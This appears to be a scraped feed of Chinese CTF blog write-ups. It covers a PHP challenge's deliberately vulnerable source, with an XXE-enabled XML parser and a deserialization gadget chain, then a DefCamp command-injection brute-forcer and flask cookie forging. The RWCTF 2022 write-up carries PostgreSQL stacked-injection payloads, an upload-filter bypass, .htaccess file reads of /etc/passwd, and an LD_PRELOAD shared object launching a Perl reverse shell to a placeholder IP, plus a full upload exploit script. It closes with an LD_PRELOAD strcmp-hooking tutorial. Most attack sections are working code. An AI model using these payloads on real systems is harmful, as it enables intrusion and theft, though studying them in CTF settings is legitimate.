$(&quot;.msg&quot;).text(msg + &quot; login fail!&quot;); }else if(code == &quot;1&quot;){ $(&quot;.msg&quot;).text(msg + &quot; login success!&quot;); }else{ $(&quot;.msg&quot;).text(&quot;error:&quot; + msg); } }, error: function (XMLHttpRequest,textStatus,errorThrown) { $(&quot;.msg&quot;).text(errorThrown + ':' + textStatus); } }); }&lt;/script&gt;&lt;/html&gt;&lt;?phpini_set(&quot;display_errors&quot;, &quot;On&quot;);error_reporting(E_ALL | E_STRICT);include &quot;class.php&quot;;libxml_disable_entity_loader(false);$xmlfile = file_get_contents('php://input');try{ $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $username = $creds-&gt;username; $password = $creds-&gt;password; $user = new User(); if (strlen($username) &lt; 20 &amp;&amp; $user-&gt;verify_user($username, $password)) { $_SESSION['login'] = true; $_SESSION['address'] = $_SERVER['REMOTE_ADDR']; $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,$username); header('Content-Type: text/html; charset=utf-8'); echo $result; die(&quot;&lt;script&gt;window.location.href='index.php';&lt;/script&gt;&quot;); } else{ $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,$username); header('Content-Type: text/html; charset=utf-8'); die($result); }}catch(Exception $e) { $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,3,$e-&gt;getMessage()); header('Content-Type: text/html; charset=utf-8'); echo $result;}?&gt; 接下来测试是否出网，发现是可以连接的， &lt;?phpsession_start();if (isset($_SESSION['login'])) { header(&quot;Location: index.php&quot;); die();}?&gt;&lt;!doctype html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt; &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt; &lt;title&gt;æ³¨å&lt;/title&gt; &lt;!-- Bootstrap core CSS --&gt; &lt;link href=&quot;./static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;style&gt; .bd-placeholder-img { font-size: 1.125rem; text-anchor: middle; } @media (min-width: 768px) { .bd-placeholder-img-lg { font-size: 3.5rem; } } &lt;/style&gt; &lt;!-- Custom styles for this template --&gt; &lt;link href=&quot;./static/css/std.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;/head&gt;&lt;body class=&quot;text-center&quot;&gt; &lt;form class=&quot;form-signin&quot; action=&quot;register.php&quot; method=&quot;POST&quot;&gt; &lt;h1 class=&quot;h3 mb-3 font-weight-normal&quot;&gt;Sign Up&lt;/h1&gt; &lt;label for=&quot;username&quot; class=&quot;sr-only&quot;&gt;Username&lt;/label&gt; &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; class=&quot;form-control&quot; placeholder=&quot;Username&quot; required autofocus&gt; &lt;br&gt;&lt;label for=&quot;password&quot; class=&quot;sr-only&quot;&gt;Password&lt;/label&gt; &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; class=&quot;form-control&quot; placeholder=&quot;Password&quot; required&gt; &lt;button class=&quot;btn btn-lg btn-primary btn-block&quot; type=&quot;submit&quot; onclick=&quot;javascript:doRegister()&quot; &gt;Sign Up&lt;/button&gt; &lt;p class=&quot;mt-5 mb-3 text-muted&quot;&gt;&amp;copy; 2018-2021&lt;/p&gt; &lt;/form&gt;&lt;/body&gt;&lt;div class=&quot;top&quot; id=&quot;toast-container&quot;&gt;&lt;/div&gt;&lt;script src=&quot;./static/js/jquery.min1.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;./static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;./static/js/toast.js&quot;&gt;&lt;/script&gt;&lt;script type='text/javascript'&gt; function doRegister(){ var username = $(&quot;#username&quot;).val(); var password = $(&quot;#password&quot;).val(); if(username == &quot;&quot; || password == &quot;&quot;){ alert(&quot;Please enter the username and password!&quot;); return; } var data = &quot;&lt;user&gt;&lt;username&gt;&quot; + username + &quot;&lt;/username&gt;&lt;password&gt;&quot; + password + &quot;&lt;/password&gt;&lt;/user&gt;&quot;; $.ajax({ type: &quot;POST&quot;, url: &quot;register.php&quot;, contentType: &quot;application/xml;charset=utf-8&quot;, data: data, dataType: &quot;xml&quot;, anysc: false, success: function (result) { var code = result.getElementsByTagName(&quot;code&quot;)[0].childNodes[0].nodeValue; var msg = result.getElementsByTagName(&quot;msg&quot;)[0].childNodes[0].nodeValue; if(code == &quot;0&quot;){ $(&quot;.msg&quot;).text(msg + &quot; login fail!&quot;); }else if(code == &quot;1&quot;){ $(&quot;.msg&quot;).text(msg + &quot; login success!&quot;); }else{ $(&quot;.msg&quot;).text(&quot;error:&quot; + msg); } }, error: function (XMLHttpRequest,textStatus,errorThrown) { $(&quot;.msg&quot;).text(errorThrown + ':' + textStatus); } }); }&lt;/script&gt;&lt;/html&gt; 还有一个index.php &lt;?phpsession_start();if (isset($_SESSION['login'])) { header(&quot;Location: index.php&quot;); die();}?&gt;&lt;!doctype html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&gt; &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt; &lt;title&gt;æ³¨å&lt;/title&gt; &lt;!-- Bootstrap core CSS --&gt; &lt;link href=&quot;./static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;style&gt; .bd-placeholder-img { font-size: 1.125rem; text-anchor: middle; } @media (min-width: 768px) { .bd-placeholder-img-lg { font-size: 3.5rem; } } &lt;/style&gt; &lt;!-- Custom styles for this template --&gt; &lt;link href=&quot;./static/css/std.css&quot; rel=&quot;stylesheet&quot;&gt;&lt;/head&gt;&lt;body class=&quot;text-center&quot;&gt; &lt;form class=&quot;form-signin&quot; action=&quot;register.php&quot; method=&quot;POST&quot;&gt; &lt;h1 class=&quot;h3 mb-3 font-weight-normal&quot;&gt;Sign Up&lt;/h1&gt; &lt;label for=&quot;username&quot; class=&quot;sr-only&quot;&gt;Username&lt;/label&gt; &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; class=&quot;form-control&quot; placeholder=&quot;Username&quot; required autofocus&gt; &lt;br&gt;&lt;label for=&quot;password&quot; class=&quot;sr-only&quot;&gt;Password&lt;/label&gt; &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; class=&quot;form-control&quot; placeholder=&quot;Password&quot; required&gt; &lt;button class=&quot;btn btn-lg btn-primary btn-block&quot; type=&quot;submit&quot; onclick=&quot;javascript:doRegister()&quot; &gt;Sign Up&lt;/button&gt; &lt;p class=&quot;mt-5 mb-3 text-muted&quot;&gt;&amp;copy; 2018-2021&lt;/p&gt; &lt;/form&gt;&lt;/body&gt;&lt;div class=&quot;top&quot; id=&quot;toast-container&quot;&gt;&lt;/div&gt;&lt;script src=&quot;./static/js/jquery.min1.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;./static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;./static/js/toast.js&quot;&gt;&lt;/script&gt;&lt;script type='text/javascript'&gt; function doRegister(){ var username = $(&quot;#username&quot;).val(); var password = $(&quot;#password&quot;).val(); if(username == &quot;&quot; || password == &quot;&quot;){ alert(&quot;Please enter the username and password!&quot;); return; } var data = &quot;&lt;user&gt;&lt;username&gt;&quot; + username + &quot;&lt;/username&gt;&lt;password&gt;&quot; + password + &quot;&lt;/password&gt;&lt;/user&gt;&quot;; $.ajax({ type: &quot;POST&quot;, url: &quot;register.php&quot;, contentType: &quot;application/xml;charset=utf-8&quot;, data: data, dataType: &quot;xml&quot;, anysc: false, success: function (result) { var code = result.getElementsByTagName(&quot;code&quot;)[0].childNodes[0].nodeValue; var msg = result.getElementsByTagName(&quot;msg&quot;)[0].childNodes[0].nodeValue; if(code == &quot;0&quot;){ $(&quot;.msg&quot;).text(msg + &quot; login fail!&quot;); }else if(code == &quot;1&quot;){ $(&quot;.msg&quot;).text(msg + &quot; login success!&quot;); }else{ $(&quot;.msg&quot;).text(&quot;error:&quot; + msg); } }, error: function (XMLHttpRequest,textStatus,errorThrown) { $(&quot;.msg&quot;).text(errorThrown + ':' + textStatus); } }); }&lt;/script&gt;&lt;/html&gt;&lt;?phpini_set(&quot;display_errors&quot;, &quot;On&quot;);error_reporting(E_ALL | E_STRICT);include &quot;class.php&quot;;libxml_disable_entity_loader(false);$xmlfile = file_get_contents('php://input');if(!empty($xmlfile)) { try{ $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $username = $creds-&gt;username; $password = $creds-&gt;password; $user = new User(); if ($user-&gt;add_user($username, $password)) { echo &quot;&lt;script&gt;alert('Registered successfully');window.location.href='login.php';&lt;/script&gt;&quot;; } else{ echo &quot;&lt;script&gt;alert('Registration failed');window.location.href='register.php';&lt;/script&gt;&quot;; } }catch(Exception $e) { $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,4,$e-&gt;getMessage()); header('Content-Type: text/html; charset=utf-8'); echo $result; }}?&gt;&lt;?phpsession_start();if (!isset($_SESSION['login'])) { header(&quot;Location: login.php&quot;); die();}?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;File Uploader&lt;/title&gt;&lt;link href=&quot;./static/css/bootstrap.css&quot; rel='stylesheet' type='text/css' /&gt;&lt;!-- Custom Theme files --&gt;&lt;link href=&quot;./static/css/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;all&quot; /&gt;&lt;!-- Custom Theme files --&gt;&lt;script src=&quot;./static/js/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;!-- Custom Theme files --&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;meta name=&quot;keywords&quot; content=&quot;File Uploader Widget Responsive web template, Bootstrap Web Templates, Flat Web Templates, Andriod Compatible web template, Smartphone Compatible web template, free webdesigns for Nokia, Samsung, LG, Sony Ericsson, Motorola web design&quot; /&gt;&lt;script type=&quot;application/x-javascript&quot;&gt; addEventListener(&quot;load&quot;, function() { setTimeout(hideURLbar, 0); }, false); function hideURLbar(){ window.scrollTo(0,1); } &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;FILE UPLOADER&lt;/h1&gt;&lt;div class=&quot;upload&quot;&gt; &lt;div class=&quot;login-form&quot;&gt; &lt;form id=&quot;upload&quot; method=&quot;post&quot; action=&quot;upload.php&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;div id=&quot;drop&quot;&gt; &lt;a&gt;Upload File&lt;/a&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; multiple /&gt; &lt;/div&gt; &lt;ul&gt; &lt;!-- The file uploads will be shown here --&gt; &lt;/ul&gt; &lt;/form&gt; &lt;/div&gt; &lt;!-- JavaScript Includes --&gt; &lt;script src=&quot;./static/js/jquery.knob.js&quot;&gt;&lt;/script&gt; &lt;!-- JavaScript Includes --&gt; &lt;!-- jQuery File Upload Dependencies --&gt; &lt;script src=&quot;./static/js/jquery.ui.widget.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;./static/js/jquery.iframe-transport.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;./static/js/jquery.fileupload.js&quot;&gt;&lt;/script&gt; &lt;!-- jQuery File Upload Dependencies --&gt; &lt;!-- Main JavaScript file --&gt; &lt;script src=&quot;./static/js/script.js&quot;&gt;&lt;/script&gt; &lt;!-- Main JavaScript file --&gt; &lt;div class=&quot;button&quot;&gt; &lt;div class=&quot;cancel&quot;&gt;&lt;a href=&quot;#&quot;&gt;Cancel&lt;/a&gt;&lt;/div&gt; &lt;div class=&quot;done&quot;&gt;&lt;a href=&quot;#&quot;&gt;Done&lt;/a&gt;&lt;/div&gt; &lt;div class=&quot;clear&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;div class=&quot;footer&quot;&gt; &lt;p&gt;Copyright &amp;copy; 2021 File Uploader. All Rights Reserved | Design by &lt;a href=&quot;#&quot;&gt;File Uploader&lt;/a&gt;&lt;/p&gt;&lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 然后又读到了一个class.php &lt;?phperror_reporting(0);$dbaddr = &quot;127.0.0.1&quot;;$dbuser = &quot;root&quot;;$dbpass = &quot;&quot;;$dbname = &quot;ctf&quot;;$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);abstract class Users { public $db; abstract public function verify_user($username, $password); abstract public function check_user_exist($username); abstract public function add_user($username, $password); abstract protected function eval(); public function test() { $this-&gt;eval(); }}class User extends Users { public $db; private $func; protected $param; public function __construct() { global $db; $this-&gt;db = $db; } public function verify_user($username, $password) { if (!$this-&gt;check_user_exist($username)) { return false; } $password = md5($password . &quot;7a28b8eb92558ea2&quot;); $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;bind_result($expect); $stmt-&gt;fetch(); if (isset($expect) &amp;&amp; $expect === $password) { return true; } return false; } public function check_user_exist($username) { $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;store_result(); $count = $stmt-&gt;num_rows; if ($count === 0) { return false; } return true; } public function add_user($username, $password) { if ($this-&gt;check_user_exist($username)) { return false; } $password = md5($password . &quot;7a28b8eb92558ea2&quot;); $stmt = $this-&gt;db-&gt;prepare(&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;); $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password); $stmt-&gt;execute(); return true; } protected function eval() { if (is_array($this-&gt;param)) { ($this-&gt;func)($this-&gt;param); } else { die(&quot;no!&quot;); } }}class Welcome{ public $file; public $username; public $password; public $verify; public $greeting; public function __toString(){ return $this-&gt;verify-&gt;verify_user($this-&gt;username,$this-&gt;password); } public function __wakeup(){ $this-&gt;greeting = &quot;Welcome &quot;.$this-&gt;username.&quot;:)&quot;; }}class File { public $filename; public $fileext; public $basename; public function check_file_exist($filename) { if (file_exists($filename) &amp;&amp; !is_dir($filename)) { return true; } else { return false; } } public function get_real_ext($minitype) { switch ($minitype) { case 'image/gif': $this-&gt;fileext = &quot;.gif&quot;; return $this-&gt;fileext; case 'image/jpeg': $this-&gt;fileext = &quot;.jpg&quot;; return $this-&gt;fileext; case 'image/png': $this-&gt;fileext = &quot;.png&quot;; return $this-&gt;fileext; default: $this-&gt;fileext = &quot;.gif&quot;; return $this-&gt;fileext; } } public function get_file_name($filename) { $pos = strrpos($filename, &quot;.&quot;); if ($pos !== false) { $this-&gt;basename = substr($filename, 0, $pos); return $this-&gt;basename; } } public function __call($func, $params) { foreach($params as $param){ if($this-&gt;check_file_exist($param)) { $this-&gt;filename-&gt;test(); } } } public function get_file_size($filename) { $size = filesize($filename); $units = array(' B', ' KB', ' MB', ' GB', ' TB'); for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024; return round($size, 2).$units[$i]; }}class Logs { public $log; public function log() { $log = $_GET['log']; if(preg_match(&quot;/rot13|base|toupper|encode|decode|convert|bzip2/i&quot;, $log)) { die(&quot;hack!&quot;); } file_put_contents($log,'&lt;?php exit();'.$log); }}?&gt;","link":"/2021/12/11/2021%E7%BE%8E%E5%9B%A2%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/"},{"title":"2022DefCamp CTF","text":"web_intro爆破flask_session的cookie flask-unsign --unsign --cookie &quot;eyJsb2dnZWRfaW4iOmZhbHNlfQ.YgYrAQ.--h0ihPw9_7i2FNqzJ-u-Oythjk&quot; 爆破出密码以后，在加密 flask-unsign --sign --cookie &quot;{'logged': True}&quot; --secret 'password' para-codeif (strlen($_GET['start']) &lt; 5){ echo shell_exec($_GET['start']);} else { echo &quot;Please enter a valid command&quot;;} 四字符getshell 队里大师傅的解,收藏起来了 m4 * 后来师傅在群里说思路，确实有被震惊到，原来他是直接循环爆破两个字符，有回显的就可以了。。 import requestsimport strings=requests.session()url=&quot;http://34.159.7.96:32210/&quot;a=&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;for i in a: for j in a: payload=f&quot;?start={i}{j} *&quot; r=s.get(url+payload).text if &quot;$flag = &quot; in r: print(payload) print(r) 确实是一个挺好的思路","link":"/2022/02/11/2022DefCamp-CTF/"},{"title":"2022rwctf","text":"hack_into_sky主要学习的点是postgresql的注入 测试注入点 ' or 0&lt;&gt;'1' or 1&lt;&gt;'1' or substr('0',1)&lt;&gt;'0' or substr('1',1)&lt;&gt;'0' or substr(current_database(),3)&lt;&gt;'f' or substr(current_database(),3)&lt;&gt;'a 测试堆叠注入 ';SELECT concat(id,age,name,email,born),1 FROM target where id='1 爆表 ';select tablename,schemaname from pg_tables where tablename like 'ta%' limit 1 offset 1;-- 字段名 ';SELECT column_name,1 FROM information_schema.columns WHERE table_name='target_credentials' limit 1 offset 0;-- 爆值 ';SELECT concat(id,account,password,access_key,secret_key),1 FROM target_credentials where id ='1 RWDN有两个端口，并且其中一个有源码，首先看一下check.js，可以发现是一个白名单 Object.keys(req.files).forEach(function(key){ var filename = req.files[key].name.toLowerCase(); var position = filename.lastIndexOf('.'); if (position == -1) { return next(); } var ext = filename.substr(position); var allowexts = ['.jpg','.png','.jpeg','.html','.js','.xhtml','.txt','.realworld']; if ( !allowexts.includes(ext) ){ res.status(400).send('Something error.'); return; } return next(); }); }; }; 要想绕过这里，首先需要搞懂，他是如何检查的，简单搭个demo模拟一下 app.post('/upload', function(req, res) { let sampleFile; let uploadPath; let userdir; let userfile; sampleFile = req.files[req.query.formid]; userdir = md5(md5(req.socket.remoteAddress) + sampleFile.md5); userfile = sampleFile.name.toString(); if(userfile.includes('/')||userfile.includes('..')){ return res.status(500).send(&quot;Invalid file name&quot;); } uploadPath = '/uploads/' + userdir + '/' + userfile; sampleFile.mv(uploadPath, function(err) { if (err) { return res.status(500).send(err); } res.send('File uploaded to http://47.243.75.225:31338/' + userdir + '/' + userfile); });}); 文件上传部分非预期解首先梳理一下流程吧，首先经过check()检查，而检查的时候，是对每一个文件都会进行检查的，然后再根据formid上传文件，如果sample是错的，那么就会导致md5错误，后面也就不会上传了。而这里就有一个逻辑漏洞，还挺巧妙地，感觉挺锻炼思维的。 首先我们看到foreach，那么就意味着他会检查每个文件，但是如果当有个文件无后缀的时候，他就直接到next()接下来就是上传文件阶段，而另一个文件则会返回400，但是他在upload函数内写的是根据formid确定上传文件，也就是说上传两个文件呢，一个为无后缀文件经过校验，到next(),另一个为其他文件但是formid为最终所需要上传的formid。 但是由于报错，无法回显文件的路径，但是可以发现samplefile的值是根据文件的内容以及其他一些信息进行确定（不涉及文件名），所以我们只要上传文件内容相同的两个文件，先获取到第一个文件的文件名即可 虽然会报出error的错误，但是文件已经成功上传了 。 可以任意文件上传，但是不解析php，等脚本，所以就是要修改apache的配置再去打 .htaccess修改配置之前学过使用其他解析方式，但是这里就是一个默认的apache服务器，连cgi script都不行，首先使用.htaccess的errordocument读一下文件 ErrorDocument 404 %{file:/etc/apache2/apache2.conf} 发现开启了这个组件 ExtFilterDefine gzip mode=output cmd=/bin/gzip 这个组件可以自启动进程，并且.htaccess可以设置环境变量，因此我们可以使用LD_PRELOAD来实现RCE 首先是.so脚本内容 #include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;__attribute__ ((__constructor__)) void preload (void){ unsetenv(&quot;LD_PRELOAD&quot;); system(&quot;id&quot;);} 接下来是.htaccess内容 SetEnv LD_PRELOAD /var/www/html/2d29bcb684acfee295dca4287d557044/tlif3.soSetOutputFilter gzipErrorDocument 404 %{file:/etc/passwd} 最后是.c文件内容（后面编译为.so） #define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;extern char** environ;__attribute__ ((__constructor__)) void preload (void) // 构建 预执行属性{ const char* cmdline = &quot;perl -e 'use Socket;$i=\\&quot;xxx.xx.xx.xx\\&quot;;$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\&quot;tcp\\&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\\&quot;&gt;&amp;S\\&quot;);open(STDOUT,\\&quot;&gt;&amp;S\\&quot;);open(STDERR,\\&quot;&gt;&amp;S\\&quot;);exec(\\&quot;bash -i\\&quot;);};'&quot;; // const char* cmdline = &quot;perl /tmp/r3.pl &gt; /tmp/r3pwn&quot; int i; for (i = 0; environ[i]; ++i) { if (strstr(environ[i], &quot;LD_PRELOAD&quot;)) { environ[i][0] = '\\0'; } } system(cmdline);} 下面放一下自己的脚本，比较杂乱，主要也是一直没成功，就没想改– mport requestsimport res=requests.session()file_content=open('./tlif3.so','rb').read()#print(file_content)url=&quot;http://xx:31337/upload?formid=form-da7de2ee-e90c-4847-8956-9ead32e51fae&quot;headers={ &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=---------------------------7451049519834705901418075379&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Cookie&quot;: &quot;PHPSESSID=b21e009db5586702c41fac89314ddd73; session=3005259290263220013%7CZEZrPpLs4Cf1IPmEi1S%2FgBj3DDa4msw9yaojKNBH6BxtMAxd4vCmixjte2t4QCy2F.EFulu3Nx8SigQj7mvZA.&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;}data=f&quot;&quot;&quot;-----------------------------7451049519834705901418075379\\r\\nContent-Disposition: form-data; name=&quot;form-da7de2ee-e90c-4847-8956-9ead32e51fae&quot;; filename=&quot;1.txt&quot;\\r\\nContent-Type: text/plain\\r\\n\\r\\n{file_content}\\r\\n-----------------------------7451049519834705901418075379--&quot;&quot;&quot;r=s.post(url, headers=headers, data=data).textpath=re.findall('http://47.243.75.225:31338/(.*?)/1.txt',r)print(r)#发送exp文件filename='tlif3.so'url=&quot;http://xx:31337/upload?formid=b&quot;data=f&quot;&quot;&quot;-----------------------------7451049519834705901418075379\\r\\nContent-Disposition: form-data; name=&quot;a&quot;; filename=&quot;null&quot;\\r\\nContent-Type: text/plain\\r\\n\\r\\nabc\\r\\n-----------------------------7451049519834705901418075379\\r\\nContent-Disposition: form-data; name=&quot;b&quot;; filename=&quot;{filename}&quot;\\r\\nContent-Type: text/plain\\r\\n\\r\\n{file_content}\\r\\n-----------------------------7451049519834705901418075379--&quot;&quot;&quot;r=s.post(url, headers=headers, data=data).textprint(r)print('http://xx:31338/'+path[0]+&quot;/&quot;+filename)so_path=&quot;/var/www/html/&quot;+path[0]+&quot;/&quot;+filenamefile_content=&quot;&quot;&quot;SetEnv LD_PRELOAD &quot;&quot;&quot;+so_path+&quot;&quot;&quot;SetOutputFilter gzipErrorDocument 404 %{file:/etc/passwd}&quot;&quot;&quot;print(file_content)#第二次 发送htaccess文件设置环境变量url=&quot;http://1xx:31337/upload?formid=form-da7de2ee-e90c-4847-8956-9ead32e51fae&quot;data=f&quot;&quot;&quot;-----------------------------7451049519834705901418075379\\r\\nContent-Disposition: form-data; name=&quot;form-da7de2ee-e90c-4847-8956-9ead32e51fae&quot;; filename=&quot;1.txt&quot;\\r\\nContent-Type: text/plain\\r\\n\\r\\n{file_content}\\r\\n-----------------------------7451049519834705901418075379--&quot;&quot;&quot;r=s.post(url, headers=headers, data=data).textpath=re.findall('http://xx:31338/(.*?)/1.txt',r)print(r)filename='.htaccess'url=&quot;http://11xx:31337/upload?formid=b&quot;data=f&quot;&quot;&quot;-----------------------------7451049519834705901418075379\\r\\nContent-Disposition: form-data; name=&quot;a&quot;; filename=&quot;null&quot;\\r\\nContent-Type: text/plain\\r\\n\\r\\nabc\\r\\n-----------------------------7451049519834705901418075379\\r\\nContent-Disposition: form-data; name=&quot;b&quot;; filename=&quot;{filename}&quot;\\r\\nContent-Type: text/plain\\r\\n\\r\\n{file_content}\\r\\n-----------------------------7451049519834705901418075379--&quot;&quot;&quot;r=s.post(url, headers=headers, data=data).textprint(r)print('http://110xx0:31338/'+path[0]+&quot;/&quot;+filename)url='http://1xx0:31338/'+path[0]+&quot;/&quot;print(s.get(url=url).text) 调试了好久好久，最终还是没成功，想了一下原因，大概是因为环境问题吧，问了一下群里师傅们，发现payload里面设置环境变量写的也是正确的，但是却没有成功加载,一步一步排查错误，最后发现是由于linux架构不一样，导致编译以后的so在docker里面无法使用，会报错，而如果是在docker里面写一样的代码，然后编译，劫持LD，发现即可成功使用系统命令 文件上传部分预期解原理参照一个小哥 在 discord 中发的内容: 如下 the proto file is not checked because Object.keys does not include properties from the prototype, but since the prototype is now an array we can use formid=1 to access that file again in the upload function upload_url2 = &quot;http://{}:{}/upload?formid={}&quot;.format(target_ip,target_upload_port,&quot;1&quot;) files = { &quot;__proto__&quot;: open(upload_file,&quot;r&quot;), &quot;decoy&quot;:(&quot;decoy&quot;,&quot;random&quot;), } 解决方案遇到这个解决问题的话，解决方案可能也只有查看一下版本信息/proc/version然后去拉一个一样的docker，跑一下 小结一下1.双文件上传绕过 2.利用htaccess读文件3.打apche所以读配置文件4.发现有进程可以劫持——&gt;LD_PRELOAD实现RCE 参考:https://team-su.github.io/passages/2022-1-22-RWCTF/https://r3kapig.com/writeup/20220125-rwctf4/","link":"/2022/01/23/2022rwctf/"},{"title":"LD_PRELOAD学习","text":"前言做题遇到这个东西，查了一下，原来是以前disable_functions的，但是没有深入研究过，现在看看。 LD_PRELOAD在学习LD_PRELOAD前需要了解一下什么是链接 链接 静态链接：在程序运行之前先将各个目标模块以及所需要的库函数链接成一个完整的可执行程序，之后不再拆开。 装入时动态链接：源程序编译后所得到的一组目标模块，在装入内存时，边装入边链接。 运行时动态链接：原程序编译后得到的目标模块，在程序执行过程中需要用到时才对它进行链接。 我们在加载动态链接的时候，需要使用一个动态链接库，其作用在于当动态库中的函数发生变化时，对于可执行程序来说是透明的，可执行程序无需重新编译，方便程序的发布/维护/更新。也就是说可执行程序虽然用得还是那些函数，但是可能函数的内容已经发生了变化，但是可执行程序将直接执行这个变化。但是如果这个动态加载的函数是恶意的（指的就是前面的变化），那么就会带来恶意的执行结果。 定义1.LD_PRELOAD是linux系统中的一个环境变量2.它可以影响程序的运行时的链接，允许你定义 ：在程序运行前优先加载 的动态链接库。即可以有选择性的载入 不同动态链接库中的相同函数。 通过这个环境变量，我们可以在自定义加载动态链接库，甚至覆盖原本的正常函数库，以达到特定的目的。 LD_PRELOAD Hook因为LD_PRELOAD可以指定在程序运行前的动态链接库，所我们可以重写程序运行过程中所调用的函数，并编译成动态链接库文件，然后通过修改LD_PRELOAD变量，让程序优先加载这个恶意动态链接库，最后当程序再次运行时便会加载动态链接库里的恶意函数。 具体步骤如下 1.定义与目标函数完全一样的函数，包括名称、变量、及类型返回值2.将包含替换函数的源码编译为动态链接库3.通过命令export LD_PRELOAD='库文件路径'，设置要优先替换的动态链接库4.替换结束，要还原函数调用关系，用命令unset LD_PRELOAD接触 实例: 在验证密码的时候，一般是使用strcmp进行对比， #include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char **argv) { char passwd[] = &quot;password&quot;; if (argc &lt; 2) { printf(&quot;usage: %s &lt;given-password&gt;\\n&quot;, argv[0]); return 0; } if (!strcmp(passwd, argv[1])) { printf(&quot;\\033[0;32;32mPassword Correct!\\n\\033[m&quot;); return 1; } else { printf(&quot;\\033[0;32;31mPassword Wrong!\\n\\033[m&quot;); return 0; }} 进行编译 gcc passcheck.c -o passcheck 改写一下strcmp同名函数,实现劫持功能: #include &lt;stdlib.h&gt;#include &lt;string.h&gt;int strcmp(const char *s1,const char *s2) if (getenv(&quot;LD_PRELOAD&quot;)==NULL){ return 0; } unsetenv(&quot;LD_PRELOAD&quot;); return 0;} 此时我们通过LD_PRELOAD劫持了strcmp函数，并启动了一个新进程，为避免陷入劫持循环，必须得删除LD_PRELOAD 执行命令编译生成ho*.so gcc -shared -fPIC hook_strcmp.c -o hook_strcmp.so 然后通过设置环境变量，使得hook.strcmp.so能被调用它的程序优先加载 export LD_PRELOAD=$PWD/hook_strcmp.so 此时结果都为correct，也即劫持了strcmp函数 其实也很好理解，此时strcmp已经丧失原本对比的功能了，此时的strcmp的内部构造为，无论如何都返回0，然后经过!的取反处理，则变成了1.所以都是password correct 要还原的话使用 unset LD_PRELOAD 否则所有有调用此函数的命令都无法正常使用 